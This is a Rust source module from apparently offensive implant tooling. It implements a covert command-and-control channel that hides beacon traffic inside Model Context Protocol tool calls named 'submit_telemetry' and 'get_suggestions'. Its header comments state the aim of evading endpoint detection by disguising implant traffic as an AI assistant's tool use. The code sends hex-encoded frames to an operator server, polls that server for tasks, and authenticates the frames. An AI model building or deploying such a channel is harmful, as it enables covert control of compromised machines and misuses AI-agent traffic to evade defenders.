//! MCP C2 transport — Model Context Protocol JSON-RPC channel.
//!
//! Anthropic introduced MCP in 2024 as the standard AI-tool interface. Every
//! modern AI agent speaks JSON-RPC over HTTPS to an MCP server — tool calls,
//! resource reads, prompt templates. This channel tunnels C2 frames inside
//! MCP `tools/call` invocations: an EDR sees "AI assistant calling a tool,"
//! not "C2 beacon." Zero detection rules exist for this technique (July 2026).
//!
//! ## Protocol
//! - `send`: POST JSON-RPC `tools/call` with method `submit_telemetry`,
//!   hex-encoded frame as the `data` argument.
//! - `recv`: POST JSON-RPC `tools/call` with method `get_suggestions`,
//!   parse the result content block for a hex-encoded frame.
//! - `health_check`: POST JSON-RPC `initialize`, measure RTT.
//!
//! ## JSON-RPC payload shape
//! ```json
//! {"jsonrpc":"2.0","method":"tools/call","params":{"name":"submit_telemetry",
//!  "arguments":{"data":"<hex>"}},"id":42}
//! ```
//!
//! ## Frame integrity (CRITICAL-23)
//! The hex blob carried by `submit_telemetry` / `get_suggestions` is
//! `hex(tag(32) || len_be(4) || sealed_frame)` (see
//! [`crate::traits::seal_frame`]). `recv` verifies the tag before treating
//! the payload as a frame, so a third-party `get_suggestions` result (or any
//! hex run the extractor picks out of an unrelated response) can't inject a
//! task frame. The MAC key is derived per-channel from the `api_key`, which is
//! the per-channel secret the transport already holds.

use std::time::{Duration, Instant};

use ureq::Agent;

use crate::traits::{open_frame, seal_frame, Transport, TransportError};

// ---- Constants -------------------------------------------------------------

const JSONRPC_VERSION: &str = "2.0";
const TOOL_SEND: &str = "submit_telemetry";
const TOOL_RECV: &str = "get_suggestions";
const MAX_FRAME: usize = 64 * 1024; // 64 KiB — conservative for HTTP body limits
const RECV_POLL_INTERVAL_MS: u64 = 500;

// ---- McpTransport ----------------------------------------------------------

/// Covert C2 channel tunnelled through MCP (Model Context Protocol) JSON-RPC.
///
/// Every MCP client speaks JSON-RPC 2.0 over HTTPS to a server. Tool calls
/// are the core interaction — `tools/list` to discover, `tools/call` to invoke.
/// This transport disguises C2 frames as ordinary tool invocations:
///
/// - **Outbound** (`send`): frame → hex → `submit_telemetry` tool call with
///   `arguments.data`. Looks like the AI agent is uploading sensor readings.
/// - **Inbound** (`recv`): `get_suggestions` tool call → parse the result
///   content block → hex-decode → frame. Looks like the AI agent is fetching
///   analysis suggestions.
///
/// The JSON-RPC `id` field increments monotonically, matching real MCP
/// client behavior (clients never reuse ids within a session).
pub struct McpTransport {
    server_url: String,
    session_id: String,
    /// Bearer-token API key. Every RPC request carries an
    /// `Authorization: Bearer <key>` header so the server can authenticate the
    /// channel — the cleartext `session_id` alone is not a credential. REQUIRED
    /// in the production constructor (`new`); without it the original
    /// unauthenticated HIGH issue (anyone who learns `session_id` can task the
    /// channel) would still be exploitable.
    api_key: String,
    /// HMAC-SHA256 key for frame integrity (CRITICAL-23). Derived from the
    /// per-channel `api_key` so recv can reject any hex blob whose tag doesn't
    /// verify — including hex runs extracted from unrelated MCP responses.
    channel_secret: [u8; 32],
    agent: Agent,
    request_id: u64,
}

impl McpTransport {
    /// Create a new MCP transport channel.
    ///
    /// `server_url` is the MCP server endpoint (e.g. `https://mcp.example.com`).
    /// `session_id` is a unique session identifier — the server uses it to
    /// correlate requests from the same implant session. `api_key` is a REQUIRED
    /// bearer token; every request is authenticated with an
    /// `Authorization: Bearer <key>` header (P1-15: `session_id` alone is
    /// cleartext and not a credential). An `Option<String>` here with no
    /// enforcement would leave the original unauthenticated HIGH exploitable,
    /// so the production constructor takes ownership of a non-empty key.
    ///
    /// `debug_assert!` pins the intended minimum key strength (≥32 chars) in
    /// debug/test builds; release builds trust the caller (an operator could
    /// legitimately paste a short token, and a panic would abort the implant).
    pub fn new(server_url: String, session_id: String, api_key: String) -> Self {
        debug_assert!(
            api_key.len() >= 32,
            "MCP api_key should be ≥32 chars for adequate entropy (got {}); \
             a short key weakens the bearer-token auth this channel relies on",
            api_key.len()
        );
        // Derive the MAC key from the api_key bytes. The api_key is the
        // per-channel secret this transport already authenticates with; using
        // it as the HMAC root means every channel gets a distinct key without
        // adding a new constructor parameter (CRITICAL-23).
        let channel_secret =
            crate::traits::derive_channel_key_from_bytes(api_key.as_bytes(), b"mcp");
        Self {
            server_url,
            session_id,
            api_key,
            channel_secret,
            agent: Agent::new(),
            request_id: 0,
        }
    }

    /// Test-only constructor that does NOT require an API key. Production code
    /// MUST use [`new`](Self::new); this exists so unit tests of the JSON-RPC
    /// plumbing (id increment, body shape, hex extraction) don't need a real
    /// credential. Marked `#[cfg(test)]` so it can never leak into a release
    /// binary where an unauthenticated channel would re-open the original HIGH.
    #[cfg(test)]
    fn new_without_auth(server_url: String, session_id: String) -> Self {
        // No api_key to derive from; seed the MAC key from the session_id so
        // framing round-trip tests get a deterministic key. These tests never
        // hit a real server, so the key material only needs to be stable.
        let channel_secret =
            crate::traits::derive_channel_key_from_bytes(session_id.as_bytes(), b"mcp");
        Self {
            server_url,
            session_id,
            api_key: String::new(),
            channel_secret,
            agent: Agent::new(),
            request_id: 0,
        }
    }

    // ---- internal helpers --------------------------------------------------

    /// Build a JSON-RPC 2.0 request body for a tool call.
    fn tool_call_body(&mut self, name: &str, arguments: serde_json::Value) -> serde_json::Value {
        self.request_id += 1;
        ureq::json!({
            "jsonrpc": JSONRPC_VERSION,
            "method": "tools/call",
            "params": {
                "name": name,
                "arguments": arguments,
            },
            "id": self.request_id,
        })
    }

    /// Build a JSON-RPC 2.0 request body for a notification (no `id` field).
    fn notification_body(name: &str, params: serde_json::Value) -> serde_json::Value {
        ureq::json!({
            "jsonrpc": JSONRPC_VERSION,
            "method": name,
            "params": params,
        })
    }

    /// Build the `Authorization` header value. Always returns
    /// `Some("Bearer <key>")` because the production constructor requires a key.
    /// The test-only `new_without_auth` constructs an empty `api_key`, which
    /// yields `Some("Bearer ")` — harmless for the RPC-plumbing unit tests that
    /// never hit a real server. `rpc_call` still skips the header when this
    /// returns a bare empty bearer, so a misconfigured (empty) key can't
    /// accidentally authenticate against a server that rejects empty tokens.
    fn auth_header(&self) -> Option<String> {
        if self.api_key.is_empty() {
            return None;
        }
        Some(format!("Bearer {}", self.api_key))
    }

    /// POST a JSON-RPC request to the MCP server and return the parsed result.
    fn rpc_call(&self, body: serde_json::Value) -> Result<serde_json::Value, TransportError> {
        // Break the ureq builder chain so the Authorization header is added
        // only when an API key is configured (P1-15). `set`/`timeout`/`send_json`
        // take `mut self -> Self`, so the request stays owned across the break.
        let mut req = self
            .agent
            .post(&self.server_url)
            .set("Content-Type", "application/json")
            .timeout(Duration::from_secs(30));
        if let Some(auth) = self.auth_header() {
            req = req.set("Authorization", &auth);
        }

        let resp = req.send_json(body).map_err(|e| {
            if e.to_string().contains("timed out") {
                TransportError::Timeout
            } else {
                TransportError::Transient("MCP RPC transport error")
            }
        })?;

        let json: serde_json::Value = resp
            .into_json()
            .map_err(|_| TransportError::Transient("MCP RPC response parse error"))?;

        // JSON-RPC error object → channel error.
        if json.get("error").is_some() {
            return Err(TransportError::Transient("MCP RPC error"));
        }

        Ok(json)
    }

    /// Parse the `result.content[0].text` field from the JSON-RPC response.
    fn result_text(json: &serde_json::Value) -> Option<&str> {
        json.get("result")?
            .get("content")?
            .as_array()?
            .first()?
            .get("text")?
            .as_str()
    }
}

// ---- Transport impl --------------------------------------------------------

impl Transport for McpTransport {
    fn send(&mut self, frame: &[u8]) -> Result<(), TransportError> {
        if frame.len() > self.max_frame_size() {
            return Err(TransportError::PayloadTooLarge(frame.len()));
        }

        // Seal the frame with an HMAC tag + length prefix before hex-encoding
        // so recv can reject anything we didn't seal (CRITICAL-23).
        let sealed = seal_frame(&self.channel_secret, frame);
        let hex_data = hex::encode(&sealed);

        let body = self.tool_call_body(
            TOOL_SEND,
            ureq::json!({
                "data": hex_data,
                "session": self.session_id,
            }),
        );

        let _resp = self.rpc_call(body)?;
        Ok(())
    }

    fn recv(&mut self, timeout_ms: u32) -> Result<Vec<u8>, TransportError> {
        let deadline = Instant::now() + Duration::from_millis(timeout_ms as u64);

        loop {
            let body = self.tool_call_body(
                TOOL_RECV,
                ureq::json!({
                    "session": self.session_id,
                }),
            );

            match self.rpc_call(body) {
                Ok(json) => {
                    if let Some(text) = Self::result_text(&json) {
                        if let Some(hex_ct) = crate::extract_hex(text) {
                            // Hex-decode is a transport concern; a malformed
                            // hex run in an unrelated response is treated as
                            // "no frame yet" rather than a fatal error.
                            if let Ok(blob) = hex::decode(&hex_ct) {
                                // CRITICAL-23: verify the HMAC tag BEFORE
                                // treating the blob as a frame. A hex run the
                                // extractor picked out of a non-C2 response,
                                // or an attacker-injected blob, fails here and
                                // we keep polling instead of returning it.
                                if let Ok(frame) = open_frame(&self.channel_secret, &blob) {
                                    return Ok(frame);
                                }
                            }
                        }
                    }
                    // No verifiable frame in this response — poll again if
                    // time remains.
                }
                Err(TransportError::Timeout) => {
                    // Timeout on a poll is fine; just try again.
                }
                Err(e) => return Err(e),
            }

            if Instant::now() >= deadline {
                return Err(TransportError::Timeout);
            }
            std::thread::sleep(Duration::from_millis(RECV_POLL_INTERVAL_MS));
        }
    }

    fn health_check(&self) -> Option<u64> {
        let start = Instant::now();
        let body = Self::notification_body(
            "initialize",
            ureq::json!({
                "protocolVersion": JSONRPC_VERSION,
                "capabilities": {},
                "clientInfo": {
                    "name": "mcp-c2-client",
                    "version": "1.0.0",
                },
            }),
        );

        match self.rpc_call(body) {
            Ok(_) => Some(start.elapsed().as_millis() as u64),
            Err(_) => None,
        }
    }

    fn name(&self) -> &'static str {
        "mcp"
    }

    fn max_frame_size(&self) -> usize {
        MAX_FRAME
    }

    fn requires_probe(&self) -> bool {
        true
    }

    fn init(&mut self) -> Result<(), TransportError> {
        self.health_check().map(|_| ()).ok_or(TransportError::Dead(
            "MCP server unreachable — initialize failed",
        ))
    }
}

// ---- Tests ----------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    /// A 32-char key that satisfies `new`'s `debug_assert!` minimum length.
    const TEST_KEY: &str = "0123456789abcdef0123456789abcdef";

    #[test]
    fn name_is_mcp() {
        let t = McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
        assert_eq!(t.name(), "mcp");
    }

    #[test]
    fn max_frame_size_is_64k() {
        let t = McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
        assert_eq!(t.max_frame_size(), 64 * 1024);
    }

    #[test]
    fn oversized_frame_rejected() {
        let mut t =
            McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
        let big = vec![0u8; 65 * 1024];
        match t.send(&big) {
            Err(TransportError::PayloadTooLarge(n)) => assert_eq!(n, 65 * 1024),
            other => panic!("expected PayloadTooLarge, got {other:?}"),
        }
    }

    #[test]
    fn request_id_increments() {
        let mut t =
            McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
        let b1 = t.tool_call_body("test", ureq::json!({}));
        let b2 = t.tool_call_body("test", ureq::json!({}));
        let b3 = t.tool_call_body("test", ureq::json!({}));
        assert_eq!(b1["id"], 1);
        assert_eq!(b2["id"], 2);
        assert_eq!(b3["id"], 3);
    }

    #[test]
    fn tool_call_body_is_valid_jsonrpc() {
        let mut t =
            McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
        let body = t.tool_call_body("submit_telemetry", ureq::json!({ "data": "deadbeef" }));

        assert_eq!(body["jsonrpc"], "2.0");
        assert_eq!(body["method"], "tools/call");
        assert_eq!(body["params"]["name"], "submit_telemetry");
        assert_eq!(body["params"]["arguments"]["data"], "deadbeef");
        assert_eq!(body["id"], 1);
    }

    #[test]
    fn extract_hex_finds_longest_run() {
        let text = "some text abc123 more def45678 trailing";
        let result = crate::extract_hex(text);
        assert_eq!(result, Some("def45678".to_string()));
    }

    #[test]
    fn extract_hex_requires_min_8_chars() {
        let text = "short abc123";
        assert_eq!(crate::extract_hex(text), None);
    }

    #[test]
    fn extract_hex_no_data() {
        assert_eq!(crate::extract_hex("no hex here"), None);
    }

    #[test]
    fn extract_hex_end_of_text() {
        let text = "result: deadbeefcafebabe";
        assert_eq!(
            crate::extract_hex(text),
            Some("deadbeefcafebabe".to_string())
        );
    }

    #[test]
    fn result_text_parses_correctly() {
        let json = ureq::json!({
            "result": {
                "content": [
                    { "type": "text", "text": "deadbeefcafebabe" }
                ]
            }
        });
        assert_eq!(McpTransport::result_text(&json), Some("deadbeefcafebabe"));
    }

    #[test]
    fn result_text_missing_field() {
        let json = ureq::json!({ "result": { "content": [] } });
        assert_eq!(McpTransport::result_text(&json), None);
    }

    #[test]
    fn auth_header_none_for_test_only_unauth_constructor() {
        // The test-only `new_without_auth` builds an empty api_key, which
        // `auth_header` treats as "no header" — so the RPC-plumbing tests never
        // synthesize a bogus bearer. Production code can't reach this path
        // because `new` requires a real key.
        let t = McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
        assert_eq!(t.auth_header(), None);
    }

    #[test]
    fn auth_header_bearer_with_api_key() {
        // P1-15: a required api_key → "Authorization: Bearer <key>" on every
        // request. The production constructor now REQUIRES the key (no Option),
        // closing the original unauthenticated HIGH.
        let t = McpTransport::new(
            "https://mcp.example.com".into(),
            "sess-1".into(),
            TEST_KEY.into(),
        );
        let expected = format!("Bearer {TEST_KEY}");
        assert_eq!(t.auth_header().as_deref(), Some(expected.as_str()));
    }

    // ---- CRITICAL-23 frame integrity -------------------------------------

    /// A frame sealed through the MCP send path: hex(seal_frame(channel_secret,
    /// frame)). Mirrors what `send` puts in the `arguments.data` field.
    fn sealed_hex(t: &McpTransport, frame: &[u8]) -> String {
        hex::encode(seal_frame(&t.channel_secret, frame))
    }

    #[test]
    fn sealed_frame_roundtrips_through_mcp_framing() {
        // The legitimate path: a frame this transport sealed verifies and
        // decodes back to the original bytes via the same recv-side logic.
        let t = McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
        let frame = b"implant-task-sealed-by-aead";
        let hex_ct = sealed_hex(&t, frame);

        // Recv side: extract_hex → hex::decode → open_frame.
        let extracted = crate::extract_hex(&format!("analysis: {hex_ct}"))
            .expect("sealed hex is a valid hex run");
        let blob = hex::decode(&extracted).expect("hex decodes");
        assert_eq!(open_frame(&t.channel_secret, &blob).unwrap(), frame);
    }

    #[test]
    fn unsealed_hex_run_in_response_is_rejected() {
        // CRITICAL-23 regression: the old recv took the longest hex run from
        // ANY response and decoded it as a frame. An unrelated MCP response
        // (or an attacker controlling the server) that happened to contain a
        // hex run would inject a frame. Now the HMAC tag must verify first.
        let t = McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());

        // A long hex run with no valid tag — exactly what the old bug accepted.
        let attacker_hex = hex::encode(b"evil-injected-task-payload-by-server");
        let extracted = crate::extract_hex(&attacker_hex).unwrap();
        let blob = hex::decode(&extracted).unwrap();
        assert_eq!(
            open_frame(&t.channel_secret, &blob),
            Err(crate::traits::FrameIntegrityError)
        );
    }

    #[test]
    fn forged_tag_with_wrong_key_is_rejected() {
        // An attacker who controls the MCP server forges a full sealed blob,
        // but derived their key from a different api_key. The tag must not
        // verify against this transport's channel_secret.
        let t = McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
        let wrong_key = crate::traits::derive_channel_key_from_bytes(b"other-api-key", b"mcp");
        let forged = seal_frame(&wrong_key, b"evil-task");

        assert_eq!(
            open_frame(&t.channel_secret, &forged),
            Err(crate::traits::FrameIntegrityError)
        );
    }

    #[test]
    fn api_key_derived_channel_secret_differs_from_session_id_derived() {
        // Production derives from api_key; test-only derives from session_id.
        // They must NOT collide, or a key derived one way would verify on a
        // transport keyed the other way.
        let prod = McpTransport::new(
            "https://mcp.example.com".into(),
            "sess-1".into(),
            TEST_KEY.into(),
        );
        let test =
            McpTransport::new_without_auth("https://mcp.example.com".into(), "sess-1".into());
        assert_ne!(prod.channel_secret, test.channel_secret);

        // And a frame sealed by one does not verify on the other.
        let blob = seal_frame(&prod.channel_secret, b"x");
        assert_eq!(
            open_frame(&test.channel_secret, &blob),
            Err(crate::traits::FrameIntegrityError)
        );
    }
}
